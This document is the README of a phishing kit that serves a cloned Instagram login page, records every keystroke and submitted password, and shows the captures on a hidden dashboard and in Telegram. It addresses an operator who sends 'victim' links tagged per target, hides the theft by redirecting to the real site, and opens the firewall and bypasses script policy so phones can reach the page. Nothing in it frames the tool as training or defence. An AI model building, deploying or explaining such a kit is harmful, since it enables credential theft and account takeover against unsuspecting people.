# fishproject

An Instagram-lookalike login page with a live keystroke + credential listener.
Serves a cloned login screen, captures everything the target types, and reports
it to three places at once: the console, a token-gated web dashboard, and
(optionally) Telegram.

Python standard library only — no pip install, no node_modules, no build step.

---

## Quick start

```powershell
cd D:\cyber\fishproject
.\ctl.ps1 start
```

That is the whole thing. `start` brings the listener up in the background and
prints two URLs:

* **victim URL** — the link you send
* **dashboard URL** — the link *you* open to watch captures

To let a phone on your Wi-Fi actually reach it (one-time, elevated):

```powershell
powershell -ExecutionPolicy Bypass -File .\allow_firewall.ps1
```

Stop it with `.\ctl.ps1 stop`. The capture log survives.

---

## Contents

* [How it works](#how-it-works)
* [Layout](#layout)
* [Control script](#control-script)
* [URLs and endpoints](#urls-and-endpoints)
* [Campaigns](#campaigns)
* [Dashboard](#dashboard)
* [Telegram push](#telegram-push)
* [Firewall](#firewall)
* [Event reference](#event-reference)
* [Reading the log](#reading-the-log)
* [Troubleshooting](#troubleshooting)
* [Changelog](#changelog)
* [Limitations](#limitations)

---

## How it works

```
   victim's phone                          this machine
 ┌──────────────────┐                  ┌──────────────────────────────┐
 │  opens the link  │  GET /?c=alice   │  server.py  :8080            │
 │                  │ ───────────────► │   • serves public/ (the page)│
 │  types username  │  POST keystroke  │   • logs every event to      │
 │  types password  │ ───────────────► │     logs/captures.log (JSONL)│
 │  hits "Log in"   │  POST credentials│   • pushes creds to Telegram │
 │                  │ ───────────────► │   • keeps a 1000-event buffer│
 │  bounced to the  │ ◄─────────────── │                              │
 │  real instagram  │   redirect       └──────────────┬───────────────┘
 └──────────────────┘                                 │
                                                      │ you open
                                                      ▼
                                        ┌──────────────────────────────┐
                                        │  /dash?k=<token>             │
                                        │   live dashboard, 2s refresh │
                                        └──────────────────────────────┘
```

Every keystroke is posted as it is typed, so partial entry is captured even if
the target never submits. Posts use `keepalive` / `sendBeacon`, so they still
land if the tab is closed or backgrounded mid-entry. On submit the page shows a
"Logging in…" beat, then redirects to the real `instagram.com`, so the failure
reads as a normal bad password.

---

## Layout

```
D:\cyber\fishproject\
  server.py           listener + static host (Python stdlib, no deps)
  dashboard.html      capture dashboard (served only via /dash?k=<token>)
  ctl.ps1             start / stop / restart / status / log
  allow_firewall.ps1  elevation helper for inbound TCP 8080
  public\
    index.html        the cloned login page
    style.css         Instagram styling
    main.js           keystroke collector + submit capture + campaign tag
  logs\               git-ignored — never leaves this machine
    captures.log      JSONL, one record per event (appended live)
    dash_token.txt    persisted dashboard token
    server.pid        pid of the background listener
```

---

## Control script

`ctl.ps1` is the front end. All five actions, plus two switches:

```powershell
.\ctl.ps1 start                    # background listener on 8080
.\ctl.ps1 stop                     # kill it; the log stays
.\ctl.ps1 restart                  # stop + start
.\ctl.ps1 status                   # running? pid? both URLs? log size? last event?
.\ctl.ps1 log                      # live tail of captures.log (Ctrl+C to exit)

.\ctl.ps1 start -Port 9090         # different port
.\ctl.ps1 start -Foreground        # run attached, watch captures scroll by hand
```

If script execution is blocked by policy, prefix any of these with
`powershell -ExecutionPolicy Bypass -File`.

**Why it's safe to poke at:** `start` records the pid in `logs\server.pid`;
`stop` kills that pid *and* whatever currently owns the port — so it can't leave
a zombie holding 8080, and can't kill something unrelated. `status` cross-checks
the port rather than trusting the pid file, so it never reports a state that
isn't real.

Raw, without the wrapper:

```powershell
python server.py 8080                                    # foreground
Get-NetTCPConnection -LocalPort 8080 -State Listen |
  ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }   # kill
```

---

## URLs and endpoints

| URL                                | Who          | What it does                                    |
| ---------------------------------- | ------------ | ----------------------------------------------- |
| `http://<lan-ip>:8080/`            | victim       | the cloned login page                           |
| `http://<lan-ip>:8080/?c=<name>`   | victim       | same page, tags every event with `<name>`       |
| `http://<lan-ip>:8080/dash?k=<tok>`| you          | live dashboard                                  |
| `GET  /api/events?k=<tok>`         | dashboard    | JSON array of recent events (last 1000)         |
| `POST /api/capture`                | the page     | collects keystrokes + credentials               |

`ctl.ps1 start` and `ctl.ps1 status` print the LAN IP, so you never have to look
it up. Server binds `0.0.0.0`, i.e. every interface.

---

## Campaigns

Send different people different links so captures never blur together:

```
http://10.109.180.144:8080/?c=alice
http://10.109.180.144:8080/?c=bob-work
```

The `c` value is read from the URL and attached to **every** event — the visit,
each keystroke, and the credential submission. It appears in the log, in the
console (magenta `[alice]`), in the Telegram push, and on the dashboard next to
the password. No campaign tag means an empty tag; nothing breaks.

---

## Dashboard

Open the dashboard URL printed by `ctl.ps1`. It refreshes every 2 seconds and
shows two panes:

* **Credentials** — every submitted username/password, newest first, with the
  source IP and campaign tag
* **Live feed** — visits, field focus, every keystroke, paste events

**Access control:** the dashboard lives at `/dash?k=<token>`. The token is
generated on first run, persisted to `logs\dash_token.txt`, and reused across
restarts — so the bookmark keeps working. `/dash` and `/api/events` both return
`404` for a missing or wrong token, so a target who guesses the path sees
nothing. To pin your own token, set `FP_DASH_TOKEN` before starting.

The dashboard is the *operator's* view. It is not linked from the login page and
is not reachable without the token.

---

## Telegram push

Get credentials on your phone the moment they are submitted:

```powershell
# 1. create a bot with @BotFather, copy the token it gives you
$env:FP_TELEGRAM_TOKEN = "123456:ABC..."

# 2. message your bot once, then find your chat id:
#    https://api.telegram.org/bot<TOKEN>/getUpdates   <-- look for "chat":{"id":...}
$env:FP_TELEGRAM_CHAT  = "987654321"

# 3. restart to pick the env up
.\ctl.ps1 restart
```

The banner shows `telegram : ON` when both are set. Leave them unset and the kit
behaves exactly as before — the feature is off by default.

Only **credential submissions** are pushed. Keystrokes would flood the chat;
watch those on the dashboard instead.

---

## Firewall

A phone on the same Wi-Fi can only reach port 8080 with an inbound allow rule.
Windows blocks it by default. Run **once, from an elevated PowerShell**:

```powershell
powershell -ExecutionPolicy Bypass -File .\allow_firewall.ps1
```

The script opens TCP 8080 inbound on the Public, Private and Domain profiles
(your Wi-Fi is usually `Public`). Undo:

```powershell
Remove-NetFirewallRule -DisplayName "fishproject-8080"
```

Until this runs, the page works from this machine (loopback) but a phone on the
network will just time out.

---

## Event reference

Every line in `logs\captures.log` is one JSON object. The `event` field says what
it is:

| event         | meaning                                                          |
| ------------- | ---------------------------------------------------------------- |
| `visit`       | someone opened the page (ip, user-agent, campaign)               |
| `focus`       | which field they tapped into                                     |
| `keystroke`   | one key, with the field's live value after the key               |
| `keystrokes`  | a flushed batch of keystrokes (same shape, in `keys[]`)          |
| `input`       | paste / autofill / IME insertion that fires no clean keydown     |
| `credentials` | the submitted username + password pair — the money shot          |
| `hidden`      | tab backgrounded (flushes the keystroke buffer)                  |
| `bye`         | tab closed (flushes the buffer via `sendBeacon`)                 |

Example record:

```json
{"ts":"2026-10-16T21:45:13.772271","event":"credentials","ip":"10.109.180.144",
 "ua":"Mozilla/5.0 (iPhone; ...)","campaign":"alice",
 "data":{"type":"credentials","username":"alice@corp.com","password":"Winter2026!"}}
```

---

## Reading the log

```powershell
# live tail, as captures arrive
Get-Content D:\cyber\fishproject\logs\captures.log -Wait

# only the credentials that were submitted
Select-String -Path D:\cyber\fishproject\logs\captures.log -Pattern '"event": "credentials"'

# pretty-print every record
Get-Content D:\cyber\fishproject\logs\captures.log |
  ForEach-Object { $_ | ConvertFrom-Json } | Format-List

# everything from one campaign
Select-String -Path D:\cyber\fishproject\logs\captures.log -Pattern '"campaign": "alice"'
```

> Note: PowerShell 5.1's `ConvertFrom-Json` mangles arrays of objects — if you
> parse the log in PowerShell, wrap with `@(...)` and index, or use Node/jq. The
> dashboard parses it correctly because browsers do.

---

## Troubleshooting

**Phone can't load the page / times out**
The firewall rule isn't applied. Run `allow_firewall.ps1` elevated. Confirm the
phone is on the *same* network as this machine, and use the machine's Wi-Fi IP
(printed by `ctl.ps1 status`), not `127.0.0.1`.

**`Port 8080 already in use`**
Something else owns it. `.\ctl.ps1 status` shows the pid; `.\ctl.ps1 stop` kills
it. Or start on another port: `.\ctl.ps1 start -Port 9090`.

**`cannot be loaded because running scripts is disabled`**
Execution policy. Prefix commands with
`powershell -ExecutionPolicy Bypass -File .\ctl.ps1 start`.

**Dashboard shows "no connection"**
The listener is down, or you're using a stale token. `.\ctl.ps1 status` reprints
the current dashboard URL. A red dot means the fetch failed.

**Telegram isn't pushing**
Both `FP_TELEGRAM_TOKEN` and `FP_TELEGRAM_CHAT` must be set *in the shell that
started the server*, and you must `restart` after setting them. Check the banner
for `telegram : ON`. The bot must have received a message from you at least once.

**Keystrokes missing for a wiped field**
The page reports the field's live value; a value cleared between keystrokes shows
as the new (shorter) value. `input` events recover paste/autofill that never fire
a keydown.

**Nothing in the log at all after a visit**
Check `.\ctl.ps1 status` for log size and last event. If the visit logged but
keystrokes didn't, the target's browser blocked the fetch — open devtools on the
page to confirm.

---

## Changelog

**`3dc2018` — dashboard, campaigns, Telegram**
* token-gated `/dash` + `/api/events`, in-memory event buffer
* `?c=` campaign tagging on every event
* optional Telegram credential push
* `ctl.ps1` surfaces the dashboard URL; token persisted to `logs\dash_token.txt`

**`48ec0bf` — initial**
* stdlib listener, Instagram-clone page, per-field keystroke stream
* `ctl.ps1` control wrapper, `allow_firewall.ps1`, JSONL capture log

---

## Limitations

* **LAN only.** The link works only for devices on the same network as this
  machine. Off-network (e.g. cellular) needs a tunnel — cloudflared or ngrok —
  in front of port 8080. Not built yet.
* **Public IP not exposed.** The server binds every interface but there is no
  NAT/firewall traversal beyond your router.
* **No built-in TLS.** Traffic is plain HTTP. A tunnel gives you HTTPS for free.
* **Token, not accounts.** The dashboard is protected by a bearer token, not a
  login. Treat the URL like a password.
* **Windows-first.** `ctl.ps1` and `allow_firewall.ps1` are PowerShell. The
  server itself is cross-platform — `python server.py` works anywhere.
